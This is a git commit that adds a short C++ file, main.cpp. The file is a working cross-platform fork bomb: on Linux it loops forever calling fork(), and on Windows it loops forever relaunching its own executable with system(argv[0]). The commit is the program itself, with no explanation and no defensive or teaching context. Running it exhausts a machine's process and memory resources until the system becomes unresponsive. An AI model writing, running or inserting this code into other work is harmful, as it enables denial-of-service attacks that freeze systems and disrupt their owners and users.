8bf379f7b762f86330dd2d1a9ef0363ee9a38d36
Guilherme Almino Carvalho <36975422+GuilhermeIsNotUnix@users.noreply.github.com>
2018-10-05 02:08:56 -0300

    Add files via upload

---
+++ main.cpp
@@ -0,0 +1,20 @@
+#include <iostream>
+
+#ifdef linux
+	#include <unistd.h>
+#elif defined(_WIN32) || defined(_WIN64)
+	#include <stdlib.h>
+#endif
+
+int main(int argc, char **argv)
+{
+	#ifdef linux
+		while(1)
+			fork();
+	#elif defined(_WIN32) || defined(_WIN64)
+		while(1)
+			system(argv[0]);
+	#endif
+	
+	return 0;
+}
